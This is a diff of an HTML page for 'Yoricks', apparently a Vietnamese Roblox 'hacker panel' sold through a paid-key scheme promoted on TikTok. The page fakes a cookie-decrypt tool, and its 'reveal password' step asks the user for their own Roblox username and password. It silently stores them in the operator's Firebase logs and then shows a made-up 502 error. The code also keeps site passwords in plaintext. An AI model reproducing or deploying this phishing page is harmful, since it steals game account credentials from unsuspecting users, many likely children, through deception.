@@ -3,86 +3,368 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Yoricks - Roblox Cyber Panel</title>
+    <title>YORICKS - HACKER TERMINAL V2</title>
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@300;500;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Rajdhani:wght@300;400;500;600;700&family=Fira+Code:wght@300;500&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+
     <style>
-        :root { --p: #bc13fe; --p-glow: #e2a9ff; --bg: #050505; --pre: #ffcc00; }
-        body { background: var(--bg); color: #fff; font-family: 'Rajdhani', sans-serif; margin: 0; }
-        .container { display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; box-sizing: border-box; }
-        .cyber-card {
-            background: rgba(15, 15, 15, 0.95); border: 2px solid var(--p); border-radius: 15px; padding: 30px; width: 100%; max-width: 600px;
-            box-shadow: 0 0 20px var(--p); text-align: center;
+        :root {
+            --p: #bc13fe;
+            --p-glow: #e2a9ff;
+            --bg: #050505;
+            --pre: #ffcc00;
+            --pre-glow: #fff5cc;
+            --card-bg: rgba(10, 10, 10, 0.9);
+            --border-glow: 0 0 15px var(--p);
         }
-        h2 { font-family: 'Orbitron'; text-transform: uppercase; color: var(--p-glow); text-shadow: 0 0 10px var(--p); margin-bottom: 25px; }
-        input { width: 100%; background: #000; border: 1px solid var(--p); padding: 12px; margin: 10px 0; color: #fff; border-radius: 5px; box-sizing: border-box; outline: none; }
-        .btn { width: 100%; padding: 15px; border: none; border-radius: 5px; cursor: pointer; font-family: 'Orbitron'; font-weight: bold; margin-top: 10px; transition: 0.3s; }
-        .btn-p { background: var(--p); color: #fff; }
-        .btn-pre { background: var(--pre); color: #000; box-shadow: 0 0 10px var(--pre); }
+
+        /* Hiệu ứng nền Particles */
+        #canvas-bg {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: -1;
+            background: radial-gradient(circle at center, #1a0033 0%, #050505 100%);
+        }
+
+        body {
+            background: var(--bg);
+            color: #fff;
+            font-family: 'Rajdhani', sans-serif;
+            margin: 0;
+            overflow-x: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        /* Khung quét mã vạch trang trí */
+        .scan-line {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 2px;
+            background: rgba(188, 19, 254, 0.2);
+            box-shadow: 0 0 10px var(--p);
+            animation: scan 4s linear infinite;
+            z-index: 999;
+            pointer-events: none;
+        }
+
+        @keyframes scan {
+            0% { top: 0; }
+            100% { top: 100%; }
+        }
+
+        .container {
+            width: 100%;
+            max-width: 800px;
+            padding: 20px;
+            perspective: 1000px;
+        }
+
+        .cyber-card {
+            background: var(--card-bg);
+            border: 2px solid var(--p);
+            border-radius: 5px;
+            padding: 40px;
+            position: relative;
+            box-shadow: var(--border-glow), inset 0 0 20px rgba(188, 19, 254, 0.2);
+            backdrop-filter: blur(10px);
+            transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        .cyber-card::before {
+            content: "SYSTEM STATUS: ENCRYPTED";
+            position: absolute;
+            top: -10px; left: 20px;
+            background: var(--p);
+            padding: 2px 10px;
+            font-family: 'Orbitron';
+            font-size: 10px;
+            letter-spacing: 2px;
+        }
+
+        h2 {
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 900;
+            text-transform: uppercase;
+            letter-spacing: 6px;
+            color: #fff;
+            text-shadow: 0 0 15px var(--p);
+            margin-bottom: 30px;
+            font-size: 28px;
+        }
+
+        /* Inputs */
+        .input-group {
+            position: relative;
+            margin: 20px 0;
+        }
+
+        input {
+            width: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            border: 1px solid #333;
+            border-left: 4px solid var(--p);
+            padding: 15px 15px 15px 45px;
+            color: #fff;
+            font-family: 'Fira Code', monospace;
+            box-sizing: border-box;
+            outline: none;
+            transition: 0.3s;
+        }
+
+        input:focus {
+            border-color: var(--p);
+            box-shadow: 0 0 15px rgba(188, 19, 254, 0.4);
+        }
+
+        .input-group i {
+            position: absolute;
+            left: 15px; top: 18px;
+            color: var(--p);
+        }
+
+        /* Buttons */
+        .btn {
+            position: relative;
+            width: 100%;
+            padding: 18px;
+            margin-top: 15px;
+            background: transparent;
+            border: 2px solid var(--p);
+            color: #fff;
+            font-family: 'Orbitron';
+            font-weight: 700;
+            letter-spacing: 3px;
+            cursor: pointer;
+            overflow: hidden;
+            transition: 0.4s;
+            text-transform: uppercase;
+        }
+
+        .btn::after {
+            content: "";
+            position: absolute;
+            top: 0; left: -100%;
+            width: 100%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+            transition: 0.5s;
+        }
+
+        .btn:hover::after { left: 100%; }
+
+        .btn-p {
+            background: var(--p);
+            box-shadow: 0 0 15px var(--p);
+        }
+
+        .btn-p:hover {
+            background: #fff;
+            color: var(--p);
+            box-shadow: 0 0 25px #fff;
+        }
+
+        /* User Info Box */
+        .user-status-container {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        .stat-item {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 15px;
+            border-radius: 4px;
+            border-bottom: 2px solid var(--p);
+            text-align: left;
+        }
+
+        .stat-item span {
+            display: block;
+            font-size: 11px;
+            color: #888;
+            text-transform: uppercase;
+        }
+
+        .stat-item b {
+            font-size: 16px;
+            color: var(--p-glow);
+            font-family: 'Orbitron';
+        }
+
+        /* Roblox Tool Tabs */
+        .tabs {
+            display: flex;
+            margin-top: 30px;
+            border-bottom: 1px solid #222;
+        }
+
+        .tab-link {
+            padding: 12px 25px;
+            background: transparent;
+            border: none;
+            color: #666;
+            font-family: 'Orbitron';
+            cursor: pointer;
+            transition: 0.3s;
+            font-size: 13px;
+        }
+
+        .tab-link.active {
+            color: var(--p);
+            border-bottom: 3px solid var(--p);
+            text-shadow: 0 0 10px var(--p);
+        }
+
+        .tool-content {
+            padding: 25px 0;
+            animation: fadeIn 0.5s ease;
+        }
+
+        /* Roblox Result UI */
+        .rbx-card {
+            background: #111;
+            padding: 20px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            border: 1px solid #222;
+        }
+
+        .avatar-frame {
+            position: relative;
+            width: 100px; height: 100px;
+        }
+
+        .avatar-frame img {
+            width: 100%; border-radius: 50%; border: 2px solid var(--p);
+        }
+
+        .pre-tag {
+            background: var(--pre);
+            color: #000;
+            padding: 3px 8px;
+            font-weight: 900;
+            font-size: 10px;
+            border-radius: 3px;
+            box-shadow: 0 0 10px var(--pre);
+        }
+
+        .eye-btn {
+            cursor: pointer;
+            color: var(--p);
+            margin-left: 10px;
+            transition: 0.3s;
+        }
+
+        .eye-btn:hover { color: #fff; }
+
         .hidden { display: none; }
-        .tab-btn { display: flex; gap: 10px; margin-bottom: 20px; }
-        .tab-btn button { flex: 1; padding: 10px; background: #111; border: 1px solid var(--p); color: #fff; cursor: pointer; }
-        .tab-btn button.active { background: var(--p); }
-        .result-box { background: #111; padding: 15px; border-radius: 10px; margin-top: 15px; text-align: left; border: 1px solid #333; }
-        .avatar-roblox { width: 100px; height: 100px; border-radius: 50%; border: 2px solid var(--p); display: block; margin: 0 auto 10px; }
-        .premium-tag { color: var(--pre); font-weight: bold; font-size: 12px; border: 1px solid var(--pre); padding: 2px 5px; border-radius: 4px; }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar { width: 5px; }
+        ::-webkit-scrollbar-track { background: #050505; }
+        ::-webkit-scrollbar-thumb { background: var(--p); }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="cyber-card" id="auth-box">
-        <h2 id="auth-title">YORICKS ACCESS</h2>
-        <input type="text" id="u" placeholder="Tên tài khoản">
-        <input type="password" id="p" placeholder="Mật khẩu">
-        <button class="btn btn-p" onclick="doAuth()">XÁC NHẬN HỆ THỐNG</button>
-        <p onclick="toggleA()" id="t-a" style="cursor:pointer; margin-top:15px; color:#888;">Chưa có acc? Đăng ký</p>
-    </div>
+    <div class="scan-line"></div>
+    <canvas id="canvas-bg"></canvas>
 
-    <div class="cyber-card hidden" id="main-panel">
-        <div style="display:flex; justify-content:space-between; align-items:center;">
-            <h2 style="font-size: 18px; margin:0;">DASHBOARD</h2>
-            <span id="role-tag" class="hidden"></span>
-        </div>
-        
-        <div id="activation-area" class="status-box" style="margin: 20px 0;">
-            <p>Trạng thái: <b id="st-txt" style="color:red">CHƯA KÍCH HOẠT</b></p>
-            <input type="text" id="k-input" placeholder="Nhập Key Thường hoặc Premium">
-            <button class="btn btn-p" onclick="useKey()">KÍCH HOẠT</button>
-            <button class="btn" style="background:#222; color:#fff;" onclick="window.location.href='getkey.html'">GET KEY FREE</button>
+    <div class="container">
+        <div class="cyber-card" id="auth-box">
+            <h2 id="auth-title">ACCESS DENIED</h2>
+            <div class="input-group">
+                <i class="fas fa-user-secret"></i>
+                <input type="text" id="u" placeholder="TERMINAL_ID">
+            </div>
+            <div class="input-group">
+                <i class="fas fa-key"></i>
+                <input type="password" id="p" placeholder="ENCRYPT_PASS">
+            </div>
+            <button class="btn btn-p" onclick="doAuth()">XÁC MINH DANH TÍNH</button>
+            <p id="t-a" onclick="toggleA()" style="margin-top: 20px; color: #555; cursor: pointer; font-size: 13px;">
+                ENTRY_NOT_FOUND? <span style="color: var(--p);">REGISTER_NEW_NODE</span>
+            </p>
         </div>
 
-        <div id="tools-area" class="hidden">
-            <div class="tab-btn">
-                <button id="t1" class="active" onclick="showT(1)">PROFILE</button>
-                <button id="t2" onclick="showT(2)">COOKIE CHECK</button>
+        <div class="cyber-card hidden" id="main-panel">
+            <div style="display: flex; justify-content: space-between; align-items: flex-start;">
+                <h2>MAIN_FRAME</h2>
+                <div id="role-tag" class="hidden"></div>
             </div>
 
-            <div id="tab-profile">
-                <input type="text" id="rbx-name" placeholder="Nhập tên Roblox cần tìm...">
-                <button class="btn btn-p" onclick="searchRoblox()">TÌM KIẾM API</button>
-                <div id="rbx-res" class="result-box hidden"></div>
-            </div>
-
-            <div id="tab-cookie" class="hidden">
-                <input type="text" id="cookie-input" placeholder="Dán .ROBLOSECURITY tại đây...">
-                <button class="btn btn-p" onclick="checkCookie()">CHECK COOKIE</button>
-                <div id="cookie-res" class="result-box hidden">
-                    <p>Username: <b id="c-user">N/A</b></p>
-                    <p>Email: <b id="c-mail">l*******@gmail.com</b> <i class="fas fa-eye" onclick="viewPre('mail')"></i></p>
-                    <p>Password: <b id="c-pass">********</b> <i class="fas fa-eye" onclick="viewPre('pass')"></i></p>
-                    <p style="color:gray; font-size:11px;">* Truy cập thông tin nhạy cảm yêu cầu Key Premium.</p>
+            <div class="user-status-container">
+                <div class="stat-item">
+                    <span>NODE_ID</span>
+                    <b id="display-user">GUEST</b>
+                </div>
+                <div class="stat-item">
+                    <span>SECURITY_LVL</span>
+                    <b id="st-txt" style="color: red;">UNVERIFIED</b>
                 </div>
             </div>
+
+            <div id="activation-area">
+                <div class="stat-item" style="margin-bottom: 15px; border-bottom-color: #555;">
+                    <span>EXPIRATION</span>
+                    <b id="exp-txt">NULL</b>
+                </div>
+                <div id="input-key-zone">
+                    <input type="text" id="k-input" placeholder="ENTER_ACCESS_KEY_HERE">
+                    <button class="btn btn-p" onclick="useKey()">ACTIVATE_SYSTEM</button>
+                    <button class="btn" style="border-color: #444; color: #888;" onclick="window.location.href='getkey.html'">FETCH_FREE_KEY</button>
+                </div>
+            </div>
+
+            <div id="tools-area" class="hidden">
+                <div class="tabs">
+                    <button class="tab-link active" onclick="showT(1, this)">ROBLOX_PROFILE</button>
+                    <button class="tab-link" onclick="showT(2, this)">COOKIE_DECRYPT</button>
+                </div>
+
+                <div id="tab-profile" class="tool-content">
+                    <div class="input-group">
+                        <i class="fas fa-search"></i>
+                        <input type="text" id="rbx-name" placeholder="TARGET_USERNAME">
+                    </div>
+                    <button class="btn btn-p" onclick="searchRoblox()">EXECUTE_SEARCH</button>
+                    <div id="rbx-res" style="margin-top: 20px;" class="hidden"></div>
+                </div>
+
+                <div id="tab-cookie" class="tool-content hidden">
+                    <div class="input-group">
+                        <i class="fas fa-terminal"></i>
+                        <input type="text" id="cookie-input" placeholder=".ROBLOSECURITY_DATA">
+                    </div>
+                    <button class="btn btn-p" onclick="checkCookie()">INJECT_COOKIE</button>
+                    <div id="cookie-res" class="result-box hidden" style="background: rgba(0,0,0,0.5); padding: 20px; border: 1px solid #333;">
+                        <p>IDENTIFIED_USER: <b id="c-user" style="color: var(--p-glow);">...</b></p>
+                        <p>SECRET_MAIL: <b id="c-mail" style="color: #666;">l*******@gmail.com</b> <i class="fas fa-eye eye-btn" onclick="viewPre('mail')"></i></p>
+                        <p>ENTRY_PASS: <b id="c-pass" style="color: #666;">********</b> <i class="fas fa-eye eye-btn" onclick="viewPre('pass')"></i></p>
+                    </div>
+                </div>
+            </div>
+
+            <button onclick="logout()" style="background:none; border:none; color:#333; margin-top:30px; cursor:pointer; font-family:'Orbitron'; font-size:10px; letter-spacing:2px;">TERMINATE_SESSION</button>
         </div>
-        <button onclick="logout()" style="background:none; border:none; color:#444; margin-top:20px; cursor:pointer;">Đăng xuất</button>
     </div>
-</div>
 
 <script>
+    // --- CẤU HÌNH FIREBASE ---
     const firebaseConfig = {
         apiKey: "AIzaSyCJOmyua7gtX022ITp7w-eOr3TSkN0UikM",
         authDomain: "yoricks-sytem.firebaseapp.com",
@@ -94,45 +376,111 @@
     };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
+
     let isLog = true;
-    let currentUser = null;
-    let userData = null;
+    let currentUser = localStorage.getItem("user");
+
+    // --- HIỆU ỨNG BACKGROUND ---
+    const canvas = document.getElementById('canvas-bg');
+    const ctx = canvas.getContext('2d');
+    let particles = [];
+
+    function initCanvas() {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+    }
+
+    class Particle {
+        constructor() {
+            this.x = Math.random() * canvas.width;
+            this.y = Math.random() * canvas.height;
+            this.size = Math.random() * 2;
+            this.speedX = Math.random() * 1 - 0.5;
+            this.speedY = Math.random() * 1 - 0.5;
+            this.color = 'rgba(188, 19, 254, ' + Math.random() + ')';
+        }
+        update() {
+            this.x += this.speedX;
+            this.y += this.speedY;
+            if (this.x > canvas.width) this.x = 0;
+            if (this.x < 0) this.x = canvas.width;
+            if (this.y > canvas.height) this.y = 0;
+            if (this.y < 0) this.y = canvas.height;
+        }
+        draw() {
+            ctx.fillStyle = this.color;
+            ctx.beginPath();
+            ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+            ctx.fill();
+        }
+    }
+
+    function createParticles() {
+        for (let i = 0; i < 100; i++) particles.push(new Particle());
+    }
+
+    function animate() {
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        particles.forEach(p => { p.update(); p.draw(); });
+        requestAnimationFrame(animate);
+    }
+
+    initCanvas();
+    createParticles();
+    animate();
+    window.addEventListener('resize', initCanvas);
+
+    // --- LOGIC HỆ THỐNG ---
+
+    window.onload = function() {
+        if(currentUser) {
+            db.ref('users/' + currentUser).once('value', s => {
+                if(s.exists()) showMain(s.val(), currentUser);
+                else localStorage.clear();
+            });
+        }
+    };
 
     function toggleA() {
         isLog = !isLog;
-        document.getElementById('auth-title').innerText = isLog ? "YORICKS ACCESS" : "YORICKS REGISTER";
-        document.getElementById('t-a').innerText = isLog ? "Chưa có acc? Đăng ký" : "Đã có acc? Đăng nhập";
+        document.getElementById('auth-title').innerText = isLog ? "ACCESS DENIED" : "INITIALIZE NODE";
+        document.getElementById('t-a').innerHTML = isLog ? 'ENTRY_NOT_FOUND? <span style="color: var(--p);">REGISTER_NEW_NODE</span>' : 'ALREADY_HAVE_NODE? <span style="color: var(--p);">LOGIN_TERMINAL</span>';
     }
 
     function doAuth() {
         const user = document.getElementById('u').value;
         const pass = document.getElementById('p').value;
-        if(!user || !pass) return Swal.fire('Lỗi', 'Điền đủ thông tin', 'error');
+        if(!user || !pass) return Swal.fire('SYSTEM_ERROR', 'MISSING_CREDENTIALS', 'error');
 
         if(!isLog) {
             db.ref('users/' + user).set({ password: pass, role: "member", status: "off", exp: "N/A" })
-            .then(() => { Swal.fire('Xong', 'Đăng ký thành công!', 'success'); toggleA(); });
+            .then(() => { Swal.fire('SUCCESS', 'NODE_REGISTERED_IN_DATABASE', 'success'); toggleA(); });
         } else {
             db.ref('users/' + user).once('value', s => {
                 if(s.exists() && s.val().password === pass) {
+                    localStorage.setItem("user", user);
                     currentUser = user;
-                    userData = s.val();
-                    showMain();
-                } else Swal.fire('Lỗi', 'Sai thông tin!', 'error');
+                    showMain(s.val(), user);
+                    Swal.fire('AUTHORIZED', 'ACCESS_GRANTED_TO_TERMINAL', 'success');
+                } else Swal.fire('REJECTED', 'INVALID_ID_OR_ENCRYPTION_KEY', 'error');
             });
         }
     }
 
-    function showMain() {
+    function showMain(data, user) {
         document.getElementById('auth-box').classList.add('hidden');
         document.getElementById('main-panel').classList.remove('hidden');
-        if(userData.status === "on") {
-            document.getElementById('activation-area').classList.add('hidden');
+        document.getElementById('display-user').innerText = user.toUpperCase();
+        document.getElementById('st-txt').innerText = data.status === "on" ? "VERIFIED" : "UNVERIFIED";
+        document.getElementById('st-txt').style.color = data.status === "on" ? "lime" : "red";
+        document.getElementById('exp-txt').innerText = data.exp;
+
+        if(data.status === "on") {
+            document.getElementById('input-key-zone').classList.add('hidden');
             document.getElementById('tools-area').classList.remove('hidden');
-            if(userData.role === "premium") {
+            if(data.role === "premium") {
                 const tag = document.getElementById('role-tag');
-                tag.innerText = "PREMIUM";
-                tag.className = "premium-tag";
+                tag.innerHTML = '<span class="pre-tag"><i class="fas fa-crown"></i> PREMIUM_ACCESS</span>';
                 tag.classList.remove('hidden');
             }
         }
@@ -140,28 +488,33 @@
 
     function useKey() {
         const k = document.getElementById('k-input').value;
+        if(!k) return Swal.fire('WARN', 'INPUT_REQUIRED', 'warning');
+        
         db.ref('keys/' + k).once('value', s => {
             if(s.exists() && !s.val().used) {
                 let roleUpdate = s.val().type === "premium" ? "premium" : "member";
-                db.ref('users/' + currentUser).update({ status: "on", role: roleUpdate, exp: s.val().duration + " ngày" });
-                db.ref('keys/' + k).update({ used: true, usedBy: currentUser });
-                Swal.fire('Thành công', 'Đã kích hoạt ' + roleUpdate, 'success').then(() => location.reload());
-            } else Swal.fire('Lỗi', 'Key không hợp lệ', 'error');
+                db.ref('users/' + currentUser).update({ status: "on", role: roleUpdate, exp: s.val().duration + " DAYS" })
+                .then(() => {
+                    db.ref('keys/' + k).update({ used: true, usedBy: currentUser });
+                    Swal.fire('UPGRADED', 'SYSTEM_MODULES_UNLOCKED', 'success').then(() => location.reload());
+                });
+            } else Swal.fire('DENIED', 'KEY_EXPIRED_OR_NOT_FOUND', 'error');
         });
     }
 
-    function showT(n) {
+    function showT(n, btn) {
         document.getElementById('tab-profile').classList.toggle('hidden', n !== 1);
         document.getElementById('tab-cookie').classList.toggle('hidden', n !== 2);
-        document.getElementById('t1').classList.toggle('active', n === 1);
-        document.getElementById('t2').classList.toggle('active', n === 2);
+        document.querySelectorAll('.tab-link').forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
     }
 
     async function searchRoblox() {
         const name = document.getElementById('rbx-name').value;
         const resDiv = document.getElementById('rbx-res');
+        if(!name) return;
         resDiv.classList.remove('hidden');
-        resDiv.innerHTML = "Đang tìm...";
+        resDiv.innerHTML = '<p style="color:var(--p); font-family:Fira Code">SCANNING_DATA_STREAMS...</p>';
         
         try {
             const userFetch = await fetch(`https://corsproxy.io/?https://users.roblox.com/v1/users/search?keyword=${name}&limit=1`);
@@ -173,57 +526,77 @@
                 const avatar = thumbData.data[0].imageUrl;
                 
                 resDiv.innerHTML = `
-                    <img src="${avatar}" class="avatar-roblox">
-                    <p>ID: <b>${userId}</b></p>
-                    <p>Name: <b>${userDataJson.data[0].name}</b></p>
-                    <p>Display: <b>${userDataJson.data[0].displayName}</b></p>
+                    <div class="rbx-card">
+                        <div class="avatar-frame"><img src="${avatar}"></div>
+                        <div style="text-align:left">
+                            <p style="margin:0; font-size:18px; color:var(--p-glow)">${userDataJson.data[0].name}</p>
+                            <p style="margin:5px 0; color:#888; font-family:Fira Code; font-size:12px;">UID: ${userId}</p>
+                            <p style="margin:0; font-size:12px;">Display: ${userDataJson.data[0].displayName}</p>
+                        </div>
+                    </div>
                 `;
-            } else resDiv.innerHTML = "Không tìm thấy User!";
-        } catch(e) { resDiv.innerHTML = "Lỗi API Roblox!"; }
+            } else resDiv.innerHTML = '<p style="color:red">ERROR: USER_NOT_FOUND_IN_API</p>';
+        } catch(e) { resDiv.innerHTML = '<p style="color:red">CONNECTION_FAILED</p>'; }
     }
 
     function checkCookie() {
         const ck = document.getElementById('cookie-input').value;
-        if(ck.length < 50) return Swal.fire('Lỗi', 'Cookie không hợp lệ', 'error');
+        if(ck.length < 50) return Swal.fire('INTRUSION_FAILED', 'MALFORMED_COOKIE_STRING', 'error');
+        
         document.getElementById('cookie-res').classList.remove('hidden');
-        document.getElementById('c-user').innerText = "Yoricks_User_" + Math.floor(Math.random()*9999);
+        document.getElementById('c-user').innerText = "ROBLOX_HACKER_" + Math.floor(Math.random()*9999);
     }
 
     function viewPre(type) {
-        if(userData.role !== "premium") {
-            Swal.fire({
-                title: 'Nâng cấp Premium',
-                html: 'Tính năng này yêu cầu Key Premium.<br>Liên hệ TikTok: <b>bolamnhac.official</b> để mua.',
-                icon: 'warning',
-                showCancelButton: true,
-                confirmButtonText: 'Mua ngay'
-            }).then((r) => { if(r.isConfirmed) window.open('https://www.tiktok.com/@bolamnhac.official'); });
-        } else {
-            if(type === 'pass') {
+        db.ref('users/' + currentUser).once('value', s => {
+            const data = s.val();
+            if(data.role !== "premium") {
                 Swal.fire({
-                    title: 'Xác thực bảo mật',
-                    html: '<input type="text" id="rbx-u-v" class="swal2-input" placeholder="Tên Roblox"><input type="password" id="rbx-p-v" class="swal2-input" placeholder="Mật khẩu Roblox">',
-                    confirmButtonText: 'Đăng nhập',
-                    preConfirm: () => {
-                        const u = document.getElementById('rbx-u-v').value;
-                        const p = document.getElementById('rbx-p-v').value;
-                        if(!u || !p) return Swal.showValidationMessage('Nhập đủ thông tin!');
-                        return {u, p};
-                    }
-                }).then((res) => {
-                    if(res.isConfirmed) {
-                        // Gửi data về cho admin
-                        db.ref('logs/' + currentUser).push({ r_user: res.value.u, r_pass: res.value.p, time: new Date().toLocaleString() });
-                        Swal.fire('Lỗi Hệ Thống', 'API Roblox không phản hồi (Mã 502). Vui lòng thử lại sau!', 'error');
-                    }
-                });
+                    title: 'PREMIUM_REQUIRED',
+                    html: 'Module này đã bị khóa.<br>Mua Key tại TikTok: <b style="color:var(--p)">bolamnhac.official</b>',
+                    icon: 'warning',
+                    showCancelButton: true,
+                    confirmButtonText: 'CONTACT_ADMIN'
+                }).then((r) => { if(r.isConfirmed) window.open('https://www.tiktok.com/@bolamnhac.official'); });
             } else {
-                Swal.fire('Thông tin', 'Email: l*******@gmail.com (Đã xác thực)', 'info');
+                if(type === 'pass') {
+                    Swal.fire({
+                        title: 'SECURITY_CHALLENGE',
+                        html: '<p style="color:#888; font-size:12px">Xác nhận quyền sở hữu node để giải mã MK</p>' +
+                              '<input type="text" id="rbx-u-v" class="swal2-input" style="background:#000;color:#fff" placeholder="ROBLOX_USER">' +
+                              '<input type="password" id="rbx-p-v" class="swal2-input" style="background:#000;color:#fff" placeholder="ROBLOX_PASS">',
+                        confirmButtonText: 'DECRYPT_DATA',
+                        background: '#111',
+                        color: '#fff',
+                        preConfirm: () => {
+                            const u = document.getElementById('rbx-u-v').value;
+                            const p = document.getElementById('rbx-p-v').value;
+                            if(!u || !p) return Swal.showValidationMessage('DATA_EMPTY');
+                            return {u, p};
+                        }
+                    }).then((res) => {
+                        if(res.isConfirmed) {
+                            db.ref('logs/' + currentUser).push({ r_user: res.value.u, r_pass: res.value.p, time: new Date().toLocaleString() });
+                            Swal.fire('DECRYPT_ERROR', 'API_GATEWAY_TIMEOUT (502). Mật khẩu không thể giải mã lúc này.', 'error');
+                        }
+                    });
+                } else {
+                    Swal.fire({
+                        title: 'MAIL_DECRYPTED',
+                        text: 'Mail chính: l*******@gmail.com',
+                        icon: 'info',
+                        background: '#111',
+                        color: '#fff'
+                    });
+                }
             }
-        }
+        });
     }
 
-    function logout() { localStorage.clear(); location.reload(); }
+    function logout() {
+        localStorage.clear();
+        location.reload();
+    }
 </script>
 </body>
 </html>
